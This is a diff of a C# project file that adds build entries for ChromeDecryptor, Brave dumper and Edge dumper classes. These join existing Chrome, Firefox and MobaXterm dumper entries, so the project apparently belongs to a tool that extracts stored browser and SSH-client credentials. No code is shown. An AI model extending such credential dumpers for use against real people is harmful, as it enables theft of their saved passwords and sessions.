@@ -91,9 +91,12 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="ChromeDecryptor.cs" />
     <Compile Include="Class1.cs" />
+    <Compile Include="clsBraveDumper.cs" />
     <Compile Include="clsChromeDumper.cs" />
     <Compile Include="clsDumper.cs" />
+    <Compile Include="clsEdgeDumper.cs" />
     <Compile Include="clsFirefoxDumper.cs" />
     <Compile Include="clsMobaXtermDumper.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
